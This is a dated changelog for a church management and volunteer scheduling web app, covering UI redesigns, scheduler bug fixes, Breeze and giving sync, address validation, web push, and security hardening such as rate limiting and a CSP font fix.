### 2026-07-07 (v1.6.4)
- **Scheduler calendar and people availability not loading**: `#schedule-output` (the card that wraps the focus-week rail + detail pane) starts `display:none` and was only revealed when `loadSchedule()` returned true — meaning D1 had schedule data for the current month. On a fresh install or with no schedule data, `schedule-output` stayed hidden indefinitely, making the calendar area invisible even though the month-nav buttons were functional. Fix: both `d1Pull()` and the INIT block now always show `#schedule-output` and call `renderFocusWeek()` even when `loadSchedule()` returns false, so the "No schedule generated yet for this month." empty-state message is always visible. (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-07 (v1.6.3)
- **Scheduler month label stuck at "Loading…"**: All three existing code paths (INIT block at page load, `schedInitScheduler` synchronous set, `d1Pull()` defensive set) have silent try/catch blocks that swallow errors. Root cause not identifiable via static analysis. Fix: `showTab('scheduler')` in `js-core.js` now directly sets `#sched-current-month-label` using `new Date().toLocaleDateString('en-US', ...)` — zero dependency on scheduler globals, runs in ChMS's own script context, no try/catch silencing. This executes synchronously every time the Scheduler tab is clicked, before `schedInitScheduler()` fires.

### 2026-07-06 (v1.6.1 follow-up)
- **v1.6.1**: Admin Ministry Roles list groups (added in v1.6.0) are now collapsible — clicking a ministry section header (Worship / Christian Ed / Acceptance / Outreach) toggles a chevron and collapses/expands that group's roles, instead of always showing all 21 roles at once. The group containing the currently-selected role always stays expanded (so selecting a role never hides it), and collapse state is bypassed entirely while searching so matches are never hidden inside a collapsed group. New `volToggleMRoleGroup()` in `src/frontend/js-volunteers.js`; chevron + collapsed-state styles in `html-head.js`.

### 2026-07-06 (v1.6.0 — static-to-dynamic ministry roles migration)
- **Root cause of the "we lost all the ministry roles other than Sunday Worship Care" report**: not data loss. The VUX5 redesign (2026-07-06, v1.5.0) built the `ministry_roles` table + admin CRUD UI, but the roles that had always been hardcoded as static HTML in each public ministry page (`src/public/ministries/worship.js`, `education.js`, `acceptance.js`, `outreach.js`) were never migrated into that table. The admin Ministry Roles tab only ever had the one role someone had added by hand through it — the other 21 "real" roles (Acolyte, Musician-type choir roles, Sunday School Teacher, Stephen Ministry, etc.) simply never existed as rows to begin with. This is the migration that was supposed to happen as part of that redesign and didn't.
- **Extracted all 21 static roles** (7 Worship, 4 Christian Ed, 4 Acceptance, 6 Outreach) into a new `MINISTRY_ROLES_SEED` array + `seedMinistryRolesFromStatic(db)` function in `src/db.js`, called from `_doInitDb()` alongside the existing `seedEvents`/`seedChmsDefaults` seed functions. Guarded per-role (`WHERE NOT EXISTS` on ministry+name) rather than a single "table is empty" check, since the table already had at least one manually-added role — a global empty-table guard would have skipped the whole backfill.
- **Removed the now-redundant static `<label class="role-card">` markup** from all four ministry page files, leaving each `.role-grid` container empty — role cards are now rendered entirely by the existing `loadDynamicMinistryRoles()` fetch-and-append logic in `src/public/scripts.js` (this function already existed from VUX5 to append *admin-added* roles after the static ones; now it's the sole source). No changes needed to that JS — it already builds the identical `.role-card` markup (checkbox `name="roles"`, `value`, `data-ministry`) that the multi-step sign-up flow's role-selection logic expects.
- Verified end-to-end with a fresh local D1 (no seed data) + `wrangler dev` + Playwright: confirmed cold start auto-seeds all 21 roles, admin Ministry Roles tab shows all 21, and each public ministry page's step-2 role picker renders its roles correctly with working checkboxes.
- **Admin Ministry Roles list now grouped by ministry** (Worship / Christian Ed / Acceptance / Outreach / …) with an uppercase section header per group, instead of one flat alphabetical-by-insertion list — requested once all 21 roles made the flat list unwieldy. (`src/frontend/js-volunteers.js` `volRenderMRolesList()`, new `.ev-list-group-hdr` style in `html-head.js`.)

### 2026-07-06 (v1.5.5 follow-up)
- **v1.5.5**: Folded the "Outreach Email Templates" section into the same left vertical sub-nav pattern as Signups/Ministry Roles/Events, instead of leaving it as an always-visible section below the shell card. Added a `.vol-subnav-divider` line under "Events" and a fourth "Templates" item below it; its content now lives in a `vol-panel-templates` wrapper toggled by the same `volShowSection()` used for the other three, so it folds out into the shared shell exactly like the rest instead of always taking up page space. (`src/frontend/html-tabs.js`, `html-head.js`, `js-volunteers.js`)

### 2026-07-06 (v1.5.4 follow-up)
- **v1.5.4**: Two more direct fixes to the Volunteers tab, per feedback on a live screenshot:
  - **Removed the four snapshot stat cards** (Open Shifts / Filled Shifts / New Signups / Upcoming Events) — not part of any mockup, and were adding vertical space above the actual working area. Deleted `volLoadSnapshotStats()` entirely (`src/frontend/js-volunteers.js`) and its call site in `showTab()` (`src/frontend/js-core.js`), plus the now-empty `vol-snapshot-stats` container div.
  - **Converted the Signups/Ministry Roles/Events sub-nav from a horizontal tab row into a left-side vertical navy menu**, matching the mockup's inner "TLC Admin" sidebar exactly (`#1E2D4A` background, `rgba(255,255,255,.55)` inactive text, `#fff` + `rgba(255,255,255,.12)` background active state, 8px/10px item padding, 6px radius). The sub-nav column now sits inside the *same* shell card as whichever panel is active (Signups list, or the Ministry Roles/Events master-detail), rather than a separate horizontal strip above a separately-carded panel — this is the sidebar → list → detail three-pane structure from the mockup, all in one card. `.ev-master-detail` no longer carries its own background/radius/shadow (redundant now that the outer shell provides it) — it's flush inside the shared card. (`src/frontend/html-tabs.js`, `html-head.js`)
  - Verified locally with `wrangler dev` + seeded ministry role/event + Playwright: confirmed cards gone, confirmed the navy vertical sub-nav renders correctly for all three sections with the master-detail panes flush against it in one shell.

### 2026-07-06 (v1.5.3 follow-up)
- **v1.5.3**: Converted the app-wide sidebar from an always-present, hover-to-expand icon rail into an off-canvas hamburger drawer, at all screen sizes (not just the old `max-width:700px` mobile breakpoint). The persistent 54px rail was quietly eating a fixed slice of every screen's width and made every admin screen's usable width narrower than what the design mockups assumed (they're all designed against a full-width working area). `src/frontend/html-head.js`:
  - `.sidebar` now sits fully off-canvas (`left:-200px`) by default and slides in at full width (`left:0`) only when `.open`, matching the drawer behavior that already existed for narrow viewports — just no longer gated behind a media query.
  - `.content-area` no longer reserves `margin-left:54px` — every tab now gets the full viewport width.
  - The hamburger button in the topbar (already wired to `openSidebar()`/`closeSidebar()`, already closing on tab navigation via `showTab()`) is now visible at all sizes instead of only appearing under 700px.
  - Removed the hover-driven reveal for section headers/labels (`.s-section-hdr`/`.s-tip` used to fade in only on `.sidebar:hover`) since the sidebar is now always either fully open (full-width, labels always visible) or fully closed (off-canvas) — there's no more collapsed-icon-only state to reveal labels over.
  - No JS changes — `openSidebar()`/`closeSidebar()`/`showTab()` already had the full drawer + backdrop + close-on-navigate behavior built for the old mobile breakpoint; this just makes it the universal behavior.
  - Verified locally with `wrangler dev` + Playwright: sidebar closed by default (full-width Home dashboard), hamburger opens the full drawer with a dim backdrop, clicking a menu item navigates and auto-closes the drawer, People tab also confirmed at full width.

### 2026-07-06 (v1.5.2 follow-up)
- **v1.5.2**: Second, stricter pixel-fidelity pass on the Ministry Roles/Events admin screens, after the v1.5.1 fix still didn't match the mockup (`04-admin-ministry-roles-editor.html`) closely enough. Root cause: the v1.5.1 rewrite still substituted this app's pre-existing "warm" design tokens (`--charcoal`, `--warm-gray`, `--border`, `--sage`, `--danger`) for the mockup's own distinct palette, on the theory that internal consistency mattered more — it didn't; the mockup's literal values are the spec.
  - Loaded **Lora** as a third Google Font (`src/frontend/html-head.js`) — the admin app previously only loaded Cormorant Garamond + DM Sans, so all mockup headings that specify Lora were silently falling back to a different serif.
  - Rewrote the `.ev-*` CSS block with the mockup's exact literal hex values instead of app tokens: navy `#1E2D4A`, muted gray-blue `#8A8898`, navy-tinted borders `rgba(30,45,74,.12)`/`.18`, cream `#F7F3EC`, moss `#4A5E3A`, danger red `#c0392b`. Moved the `--ev-*` custom properties to `:root` so they're available to the shift modal too (previously scoped only to `.ev-master-detail`).
  - Ministry Roles detail pane: moss "Open on site" badge (was a generic pill), red "Delete role" text link (was inside a button), wording changed to "Add role"/"Open"/"Hidden" to match the mockup exactly (was "+ Add Role"/"Visible"/"Hidden").
  - Events detail pane: teal "Visible on site" badge (kept distinct from Ministry Roles' moss badge since the two mockups use different colors for the same concept), "Show event"/"Hide event" wording (was "Make Visible"/"Hide Event"), field grid rebuilt to match the mockup's 2-column Name/Date row.
  - Shift modal: Lora serif title, navy-tinted `rgba(30,45,74,.35)` backdrop (was plain black), exact label/border colors.
  - **Bug found during this pass**: the new `.ev-fields label` rule (uppercase, tiny, letter-spaced — correct for real field labels) was also matching the `<label class="toggle-switch ev-toggle-row">` wrapper around the "Visible on the volunteer site" toggle, which stripped its `display:flex` down to `display:block`. That collapsed the toggle-track span to zero width (inline elements ignore explicit width/height), leaving its 14px knob `::after` floating at the collapsed span's position — visually landing mid-word and splitting "Visible" into "Vis[knob]le". Fixed with a higher-specificity `.ev-fields label.ev-toggle-row` override that restores `display:flex` and resets the text styling back to a normal label. Caught via Playwright + `getComputedStyle`, not by inspection — worth remembering any time a generic `label` selector is layered under a `.toggle-switch`.
  - **Layout structure fix**: the Volunteers tab previously stacked Signups, Ministry Roles, and Events as three full-width sections on one scrolling page — so seeing Ministry Roles meant scrolling past the entire Signups list first. The mockups treat these as separate top-level destinations (their own sidebar items). Added a sub-tab row (`Signups | Ministry Roles | Events`, `.vol-subtab-btn` pills with an active underline) directly under the Volunteers snapshot stats; `volShowSection()` toggles which of the three `vol-panel-*` wrapper divs is visible so only one shows at a time, giving the intended three-pane feel (ChMS sidebar → sub-tab → list+detail) within the existing single-Worker admin app, without spinning Ministry Roles/Events/Signups out into separate top-level ChMS sidebar tabs.
  - Verified end-to-end with a local `wrangler dev` + seeded D1 data + Playwright screenshots for Signups/Ministry Roles/Events/shift-modal states.

### 2026-07-06 (v1.5.1 follow-up)
- **v1.5.1**: Two fidelity fixes to the v1.5.0 volunteer/events redesign, found by comparing the live site against the original design mockups:
  - **CSP was blocking every Google Font on the whole app.** `SEC_HEADERS`'s `Content-Security-Policy` (`src/auth.js`) had `style-src 'self' 'unsafe-inline'` with no allowance for `https://fonts.googleapis.com`, and no `font-src` directive at all (falls back to `default-src 'self'`, blocking `fonts.gstatic.com`). This predates this redesign — confirmed via `git log` — and has apparently been silently forcing every page (public and admin) to fall back to system fonts instead of Lora/Source Sans 3/Cormorant Garamond/DM Sans since the CSP was first added. Fixed by adding both allowances.
  - **Admin Events/Ministry Roles master-detail wasn't one unified card.** The list column and detail column rendered as two independent floating boxes instead of a single rounded-corner, shadowed shell like the mockup (`.ev-master-detail` now carries the card's background/radius/shadow; `.ev-list-row` no longer looks like an individual card). Also moved "Search roles…" + "+ Add Role" inside the Ministry Roles list column (search top, button pinned to a footer) and "Events" + "+ New" inside the Events list column header, matching the mockups instead of sitting in a page-level header above the shell.

### 2026-07-06
- **v1.5.0**: Volunteer/Events UX redesign — public sign-up + full admin Volunteers tab. Implements the approved `design_handoff_volunteer_mobile_ux` package (screens #04, #06–#09, #11, #13; #01 base + #02/#03 as an add-on card; shift-first alternate #10 and accordion alternate #12 explicitly NOT used per the chosen directions).
  - **Public event sign-up** (`src/public/scripts.js`, `head.js`): contact-first flow — day-toggle pills + contact card now show immediately (no longer gated behind picking a day first); 3-tier capacity badges (green ≥4 left / gold 1–3 left / gray Full, replacing the old "N of M spots" text); shift-card selected state now teal, scoped to `.slot-card` only (ministry role cards elsewhere unchanged).
  - **Public landing page**: added a "Not sure where to start?" CTA below the values strip, launching a new 2-tap **Find Your Fit** guided flow (`src/public/findfit.js`) — time commitment + interest checkboxes, results pulled live from `/api/ministry-roles` for the selected ministries, each linking into that ministry's page.
  - **Ministry role sign-up** (worship/education/acceptance/outreach/lasm/wol/cfna): added a third **Confirm & submit** step — read-back summary of name/email/phone/roles before final submission, plus a "reminder before I get started" opt-in checkbox (`sms_reminder_opt_in` — stored for staff to act on manually; no automated reminder-sending was built, since ministry-role signups have no per-signup date to schedule against).
  - **Admin — Events tab**: replaced the old flat accordion of always-editable inline inputs with a master-detail shell (event list + detail pane) and a proper **Add/Edit shift modal** for time-slotted events, grouped by day with fill-rate bars — this was the core fix for the live product's "a stray click edits real data" problem. Non-time-slotted (simple) events keep their existing inline role editor plus a new **signups roster** view (name/roles/status) below it.
  - **Admin — Ministry Roles tab**: replaced the single-ministry-filtered list + inline form with a searchable master-detail list + side edit panel across all ministries at once.
  - **Admin — Signups tab**: added a status workflow (`new → contacted → confirmed`/`declined`) — status filter pill row with live counts, inline per-row status `<select>`; sending an outreach email auto-advances `new → contacted`. New `signups.status` column (migration `0010_signup_status.sql`).
  - **Admin — Settings tab**: new "Volunteer Site & Notifications" card (address/public email/phone shown on the public site; toggle to email the office on every new sign-up — wired to a real Resend send in `handleSignup`; weekly-digest toggle stores the preference only, no digest cron exists yet).
  - **Admin — Volunteers tab**: new snapshot stat row (open/filled shifts, new signups this week, upcoming events) at the top, pulling from the same events/signups data already loaded.
  - **Bug fixes found via verification** (pre-existing, unrelated to the redesign but caught while working in this file): `vol-link-person-modal` and `vol-send-email-modal` used a `.modal-box` class with no CSS definition (dead — the visible modal card styling never applied) and carried a hardcoded `style="display:none"` that permanently overrode the `.open` class toggle used to show them. Both now use the shared `.modal` class with no inline display override, matching every other modal in the app. Also fixed the "Link to Person" button's `onclick` handler, which built its arguments with `JSON.stringify(...)` inside a double-quoted HTML attribute — the embedded double quotes silently truncated the attribute, breaking the handler for every signup. New `volJsAttr()` helper HTML-entity-encodes the quotes instead.
  - Verified end-to-end with a local `wrangler dev` + seeded D1 data + Playwright across both admin and public flows (screenshots for each; the two bugs above were caught this way, not by inspection).

### 2026-07-03
- **v1.4.0**: People Directory / Person Profile / Household View visual redesign (warm navy/teal/gold palette, larger high-contrast type, real mobile tap targets). Implements the approved design package (`People Directory - Improvements` handoff). Highlights:
  - **People list**: new List/Card view toggle (persisted in localStorage, no refetch), warmer table styling (`--warm-surface-header` header, zebra rows, 14-15px type), member type now shown as a color-coded dot + label instead of a filled pill, table simplified to Name/Type/Contact (Household/Tags columns dropped per the approved layout — still visible on the profile). Phone is now a clickable `tel:` link in the table too.
  - **Mobile People list**: rows get 50px avatars and real tap-target buttons — filled teal "Call", outlined cream "Email"/"Map" (36px+ min-height) — replacing the old plain-text phone/address links.
  - **Person Profile**: header restyled with Cormorant Garamond serif name, dot+label status, clickable household link, new Call/Edit action buttons in the header (Email/Map swap in on mobile, Edit hides). Tabs' active indicator is now gold. Mobile hides the Giving/Attendance/Timeline tabs and shows Information only (fixed a real layout bug where the aside's `flex-shrink:0` was collapsing the main content column to ~0px height on narrow viewports).
  - **Household View**: converted from a cramped modal into a full-page view (mirrors the Person Profile's `pv-mode` pattern via a new `hv-mode`) — icon tile header, member rows with color-coded status, and a desktop-only summary strip (current-year giving for finance+ roles, envelope #, anniversary). `GET /admin/api/households/:id` now also returns household-level `envelope_number`/`anniversary_date` (sourced from the head of household, falling back to any member). Household cards in the Households tab now open this view instead of jumping to the head-of-household's profile.
  - **Shared system**: consolidated three separate ad-hoc avatar-color arrays (table/profile/family) into one `avatarTint(id)` helper with a warm 5-tint palette (gold/sky/terracotta/sage/blush); added `typeColor()`/`typeDotHtml()` helpers for the dot+label component used across all three screens.
  - Verified end-to-end with a local `wrangler dev` + seeded D1 data + Playwright screenshots (desktop and mobile) for all three screens plus multi-select in both List and Card view.

### 2026-06-23
- **v1.2.4**: Old System Comparison tool. Upload an Excel (.xlsx) spreadsheet from a previous system. Browser parses it with SheetJS, auto-maps column headers (with manual override), sends rows to `POST /admin/api/import/old-system-compare`. API name-matches against active people and diffs: birthday, baptism date, confirmation date, anniversary date, email, phone, address. Results show tabbed by status (Differences / Not Found / Multiple Matches / Identical). "Apply Old" button per patchable field uses the existing PATCH endpoint to write the value. Admin-only.
- **v1.2.3**: Visitor Review Batch bulk reset. "Mark All Reviewed" button in the section header sets `last_reviewed_at=today` for every pending stale visitor/friend record in one click. New `POST /admin/api/engagement/mark-all-reviewed` endpoint. Button only appears when there are records pending.
- **v1.2.2**: Dashboard baptism anniversaries card. New "Baptism Anniversaries" card on the dashboard shows members whose `baptism_date` falls in the selected month (same month navigation as birthdays). Includes copy-for-bulletin button and is togglable via the Customize panel. API adds `baptismAnniversaries` to `/admin/api/dashboard` response.

### 2026-06-16
- **v1.1.3**: Defensive fix — `d1Pull()` now sets the month label after a successful data load as a belt-and-suspenders fallback (tries both `current-month-label` and `sched-current-month-label`). Prevents the label from being stuck at "Loading…" if the page-load INIT block fails silently.
- **v1.1.2**: Removed "Church Mgmt" and "Volunteers" links from the scheduler top nav bar.
- **v1.1.1**: Scheduler assignment dropdowns now show ALL people with the role, regardless of service preference. Previously only people marked for that specific service (or "both") appeared. The pool now sorts preferred-service people first, with cross-service fills labeled `• other svc` so admins can see at a glance who's a stretch pick. Blackout dates and absences still exclude people. Auto-scheduling logic unchanged.

### 2026-05-21
- **v228**: Scheduler integrations panel now shows real env-var presence. `/admin/api/scheduler/config` includes `hasBreezeApiKey` / `hasResendKey` / `hasWorkerSecret` booleans. Frontend init flips the secret rows to ✓ green ("configured on server") or ✗ red ("not configured"), and value rows (Breeze subdomain / Worker URL / From address) show "(not configured)" in red italic when the corresponding env var is missing. Replaces the prior hardcoded "configured on server" labels that lied when the env var was absent. Makes "EMAIL_FROM is unset" diagnosable from the UI without checking Cloudflare Dashboard.
- **v227**: Fix scheduler reminder emails returning 401. v184 had made `env.RESEND_API_KEY` win over the `X-Resend-Key` header at `/email/send`, so the key saved in the scheduler UI was being ignored. If the env key was unset, expired, or registered to a different sender domain than Resend had verified, scheduler emails got rejected even though the UI had a working key. Reverted `/email/send` to header-first, env-fallback. Cron birthday/anniversary paths in api-emails.js still use env directly so v184's consolidation goal stays intact for them.

### 2026-05-21 (earlier)
- **v226**: AU1 — forgot-password flow. New `email` column on `app_users` (migration 0008 + runtime). Login page has a "Forgot password?" link that toggles an inline form (username or email). `POST /admin/forgot-password` always returns 200 to prevent account enumeration; rate-limited 5/15min per IP via `RSVP_STORE`. 32-byte hex tokens stored with 1-hour TTL. Branded reset email via Resend points at `/admin/reset?token=...`. Reset page validates the token, requires matching new passwords (≥8 chars), updates `password_hash`, deletes the token. Settings → Users gains an Email column and an Email field in create/edit. Need: `RESEND_API_KEY` + `EMAIL_FROM` already configured; admins should backfill emails on existing user accounts.

### 2026-05-20
- **v225**: Three quick wins — FH6, RI2, BUG2. (1) **FH6**: new `PATCH /admin/api/people/:id` endpoint that only updates fields present in the body; `markSeenToday` / `savePvTags` / `confirmAddToHh` switched from full-snapshot PUT to sparse PATCH so concurrent edits aren't clobbered. (2) **RI2**: Breeze sync now discovers a separate boolean/dropdown field for "Baptized"/"Confirmed" alongside the date field; `baptized=1`/`confirmed=1` is set when either is truthy. People Insights sacramental pipeline will populate on next bulk sync. New `isYes`/`isYesPS` helpers recognize Yes/true/1/on/baptized/confirmed. Updated in both bulk and per-person sync paths. (3) **BUG2**: validate-address `.catch` handlers now show the actual error message + prompt admin to set USPS keys. Documented `USPS_CLIENT_ID`/`USPS_CLIENT_SECRET`/`USPS_USER_ID`/`LOB_API_KEY`/`REPLY_TO_EMAIL` as optional secrets in SECRETS.md.
- **v224**: Code review follow-up — Phases 14–18. (1) **Cron correctness** — birthday/anniversary date matching and Saturday schedule-reminder check now use Central Time via Intl/America-Chicago, not UTC. Defense for test-button paths and any future cron-time shift. (2) **Email safety** — names HTML-escaped in birthday/anniversary templates; all four email/SMS send loops parallelized with `Promise.all` and audit-log writes batched. (3) **Intake hardening** — `/api/intake/*` now rate-limits per IP (10/15 min via RSVP_STORE) and rejects payloads >20 KB. (4) **Photo upload validation** — new `validateImageUpload()` sniffs JPEG/PNG/GIF/WebP magic bytes and caps at 8 MB; replaces trust of client-supplied MIME. (5) **CSV import** — giving CSV capped at 10 MB. (6) **Config endpoint** — `church_ein` only returned to admins (was leaking to staff/finance). (7) **Bulk tags** — new `POST /admin/api/people/bulk-tags` endpoint replaces 2N round-trips with one; closes FH4. (8) **Index** — `idx_giving_breeze` on `giving_entries(breeze_id)` for sync-dedup speed (migration 0007 + runtime). (9) **Mobile** — chart resize handles support touch events; register table wrapped in horizontal scroll container; buttons get 44px min-height under 600px viewport; modals shrink padding + grow to 95vh on phones. (10) **Scheduler hygiene** — `formatServiceTime()` / `formatRsvpStatus()` helpers replace 3× duplicated ternaries; `officeEmail(env)` centralizes reply-to.

### 2026-05-06
- **v185**: Fix portal invite loop, intermittent profile photos, and idle session timeout. (1) `/portal/verify/:token` was routing to the SPA login screen instead of the server-side set-password handler — clicking "Create your account" from there re-sent the invite email, creating a perpetual loop. Fix: route `/portal/verify/*` to `handleMemberApi` (before the SPA catch-all). (2) Idle session timeout extended from 30 min → 8 hours so R2-stored profile photos (which require the auth cookie) stay visible through a normal workday. (3) Breeze photo proxy now returns 404 on CDN auth failure instead of a transparent 1×1 GIF, so the `onerror` handler fires and shows initials. (4) Photo upload post-upload preview now uses `photoSrc()` wrapper consistently.
- **v184**: Consolidate Resend API key. `env.RESEND_API_KEY` now takes priority over the `X-Resend-Key` header in `api-scheduler.js` so one `tlc-chms` worker secret covers portal invite emails, birthday/anniversary emails, and scheduler emails. Bumped DEPLOY_VERSION.
- **v183**: Surface Resend errors on portal invite. `sendInviteEmail` previously swallowed all Resend API errors silently (`.catch(() => {})`). Now logs to console, returns structured error object, and the invite endpoint responds with HTTP 500 + error detail so the admin sees what went wrong.
- **v182**: Fix member_type case mismatch. Breeze sync stores `'Member'` (capital M) but frontend compared `'member'` (lowercase). Fixed all `member_type` comparisons in `js-people.js` to use `.toLowerCase()`. DB cold-start normalization in `db.js` lowercases all existing `member_type` values idempotently. Affects: "Invite to Portal" button visibility, organization tab, person list badges.
- **v181**: Web Push notifications for member portal. Full RFC 8291 payload encryption + RFC 8292 VAPID JWT using only Web Crypto API (no npm). New `src/push-sender.js` — `sendWebPush` + `broadcastWebPush`. New `src/portal-sw-js.js` — service worker served at `/portal-sw.js` handles push events and notification clicks. Member portal: SW registration on init, `setupPushNotifications()` requests permission + subscribes 4 s after login. New endpoints: `GET /member/api/vapid-public-key`, `POST /member/api/push-subscribe`. Admin push broadcast: `POST /admin/api/push-broadcast` + Settings UI modal. Cron: `sendScheduleReminders` runs Saturdays, finds members assigned next Sunday via KV, sends push. DB migration: `migrations/0005_push_subscriptions.sql` adds `push_subscription TEXT` to `app_users`.

### 2026-05-01
- **v165**: ST1/RI1/PF2 — Three filter/visibility improvements. (1) **ST1**: Automated Emails and Automated Texts test cards in Settings are now `require-admin` — hidden from staff/finance/member roles. (2) **RI1**: People Insights defaults to Members only (scope=member); "Members Only / All Active" toggle buttons let admins switch the scope for all six chart blocks. (3) **PF2**: Positive people filters added — Gender radio (Any/Male/Female/Not set) and Age Range radio (Any/Under 18/18-29/30-44/45-64/65+) in the filter drawer. Both wire through to the backend `GET /people` query. Active filter chips shown for each. Also: revert `wrangler-action@v4` → `@v3` (v4 tag doesn't exist on the action).
- **v164**: Fix bulk address validation timeout. Paginate to 50 addresses/request; cache USPS OAuth token once per page.
- **v163**: Add USPS OAuth 2.0 API support (USPS_CLIENT_ID + USPS_CLIENT_SECRET secrets). Priority chain: USPS OAuth → USPS WebTools XML → Lob → Census Bureau.
- **v162**: Add privacy settings for DOB and anniversary (dir_hide_dob, dir_hide_anniversary). Enforce all five privacy flags for member-role API responses.
- **v161**: Replace Lob-only address validation with USPS OAuth + Census Bureau fallback. Add "Validate All Addresses" bulk operation.
- **v160**: Fix BUG1/BUG2 — utils/ routes returning 404 (missing from api-admin.js delegation guard).

### 2026-04-28
- **v152**: Swap address validation from USPS to Lob. USPS OAuth was difficult to provision; Lob uses simple Basic auth (API key as username). Backend (`src/api-utils.js`) now calls `POST https://api.lob.com/v1/us_verifications` with `LOB_API_KEY` secret. Lob's `deliverability` field is mapped to the same Y/S/D/N values the frontend already handles. Button label updated from "Validate Address (USPS)" → "Validate Address". Add secret: `wrangler secret put LOB_API_KEY`.
- **v151**: Google Maps embed on person profile. When a person has a street address + city, a "Show Map" button appears in the Contact card. Clicking it lazy-loads a Google Maps iframe (240 px, no API key required) pinned to their address with a built-in "Get Directions" link — on mobile this opens Google Maps for turn-by-turn navigation. Clicking again collapses the map. (`src/frontend/js-people.js`)
- **v150**: Three UX improvements: (1) **Phone normalization** — `normalizePhone()` added to `api-utils.js`; called on every person POST and PUT so all new/edited phones are stored as `(XXX) XXX-XXXX`. Phone field in person edit form formats on blur. Settings → "Normalize All Phones" admin button runs `POST /admin/api/utils/normalize-phones` to reformat all existing rows in one pass (safe to run multiple times). (2) **USPS address validation** — `POST /admin/api/utils/validate-address` calls the USPS REST API v3 with OAuth2 client credentials (secrets `USPS_CLIENT_ID`, `USPS_CLIENT_SECRET`). Token cached per Worker isolate (~1 h). Returns standardized address + `dpvConfirmation` (Y/S/D/N). "Validate Address (USPS)" button in person edit form fills fields and shows delivery status. (3) **Create household from profile** — Family card on person profile now shows "+ Create Household" and "Link to Existing" buttons when no household is linked. "+ Create Household" POSTs a new household (last name + " Family"), sets person as head, and refreshes profile. "Link to Existing" opens the person edit modal (already has a household picker). (`src/api-utils.js`, `src/api-people.js`, `src/api-chms.js`, `src/frontend/html-tabs.js`, `src/frontend/js-people.js`, `src/frontend/js-export-import.js`)
- **v149**: Fix Organizations tab not showing person-records flagged as organizations. The tab queried only the `organizations` table, while people set to `member_type='Organization'` live in the `people` table — and the People list explicitly excludes them (`LOWER(p.member_type) != 'organization'`), so those records were invisible everywhere. `GET /admin/api/organizations` now UNIONs in active, non-archived, non-deceased people whose `member_type='organization'`; rows carry a `source` field (`'org'` or `'person'`). Frontend cards show a "Person record" badge for the latter and route clicks to the person profile (`showProfile`). Replaced the fragile inline `onclick="openOrgEdit("+JSON.stringify(o)+")"` pattern (JSON's double quotes break the attribute) with an index lookup against a cached `_orgRows` array. (`src/api-households.js`, `src/frontend/js-households.js`)

### 2026-04-27
- **v148**: Fix Breeze giving sync leaving orphan entries behind. The orphan cleanup pass at the end of `import/breeze-giving` previously only deleted a row when a same-person+same-date "current replacement" also existed in giving/list — a guard meant to protect intentional Breeze deletions. In practice it left permanent extras in two common cases: (1) Breeze edits that change the contribution date (old date has no replacement), and (2) full deletes that come through `bulk_contributions_deleted` (which references the batch, not the payment IDs, so the sync's dedup never sees them). Surfaced as the 40085 General Fund discrepancy of 1 entry / $68.44 the user kept reporting. Fix: drop the same-day gate and delete every row whose `breeze_id` is missing from giving/list for the window. Two safeguards remain: skip the cleanup if giving/list returned `>= 10000` rows (likely truncated) or if more than 50% of in-window DB rows would be deleted (suggests an API failure, not a real cleanup). Split-suffix `pid-N` legacy CSV rows are also handled — they match if the base pid is in giving/list. New diag fields: `orphanSafetyAbort`, `orphanSafetyReason`, `breezePaymentsForCleanup`. Frontend sync result line updated. (`src/api-import.js`, `src/frontend/js-export-import.js`)
- **v140**: Fix people list showing empty. Removed redundant `(p.status IS NULL OR p.status='active')` from the active-view WHERE clause in the people list API — `active=1` alone is sufficient since archive/deceased always sets `active=0`. Also fixed `api()` helper to properly reject on non-2xx responses (`!r.ok && data.error`) so server errors surface as "Error loading people." rather than silently showing "No people found."
- **v139**: Fix broken v138 — revert `db.batch()` for DDL (D1 doesn't support it reliably), keep only the isolate-level `_initPromise` cache. Net: `initDb` runs once per Worker isolate, zero overhead on subsequent requests.
- **v138**: (broken — superseded by v139) Attempted to batch CREATE TABLE statements with `db.batch()`.
- **v137**: Fix every-tab-loading regression. `js-core.js` had two `function applyRoleUI` declarations; JS hoisting made the second (no-param version) silently override the first. The second ignored its argument, fired a duplicate `/admin/api/me` fetch on every page load, and called `showTab()` when it resolved — so `loadDashboard()` was triggered twice, the second call reset the dashboard back to "Loading…" after the first had already rendered it, and any latency on that second round-trip left tabs stuck. Fix: removed the duplicate, merged its features (unknown-role redirect, display_name badge) into a single `applyRoleUI(role, displayName)` that sets `_userRole` synchronously so the `finally` block picks up the correct role in one shot. Also removed duplicate `var _userRole = 'admin'` declaration.
- **v136**: Fix Breeze CSP error and silent delete failure. `breezeGet`/`breezePost` now fall back to `window.location.origin` when no Worker URL is stored, so Breeze API calls stay same-origin after the domain rename to `chms.timothystl.org`. Updated Settings placeholder/hint to say "Leave blank to auto-detect". `deletePerson` now shows an alert on API error instead of silently failing.
- **v135**: Fix scheduler edit-person crash (`TypeError: Cannot read properties of undefined (reading 'indexOf')`). `editPerson()` now guards `person.preferredSundays` and `person.roles` with `|| []` fallbacks.
- **v134**: Attendance chart improvements. X-axis labels include 2-digit year when data spans multiple calendar years (e.g. "Jan 2 '22"). Easter/Christmas markers include year suffix ("Easter '24"). Added "↓ PNG" button to download the chart SVG as a dated PNG file.

### 2026-04-26
- **v133**: BR1 — Auto-sync people to Breeze on create and update. (1) New person created without `breeze_id`: auto-push to Breeze immediately after save (fire-and-forget, silent failure). Breeze returns the new person ID which is stored back in `people.breeze_id`; logged as `auto_push_to_breeze` in `audit_log`. (2) Existing person with `breeze_id` updated: if any of `first_name`, `last_name`, `email`, `phone`, `address1`, `address2`, `city`, `state`, `zip` changed, auto-update Breeze contact fields (fire-and-forget). (3) Added `updatePerson(breezeId, first, last, fieldsJson)` to `src/breeze.js` (`POST /api/people/update`). (4) Extracted `getBreezeFieldIds(db, breeze)` and `buildBreezeContactFields(fieldIds, person)` as shared helpers — duplicate field-ID discovery code removed from manual push-to-breeze handler. No frontend changes needed; "Push to Breeze" button remains as manual fallback for people created before this feature.
- **v132**: Weekly tasks auto-seed. When the current week has no tasks yet, the GET handler now auto-seeds from the prior week's tasks (so each new week inherits last week's list, all unchecked). If no prior-week tasks exist (first-time use), seeds two hardcoded defaults: "Pray for people prayer cards" and "Work through member list". Only applies to the current week — viewing historical weeks is unaffected.
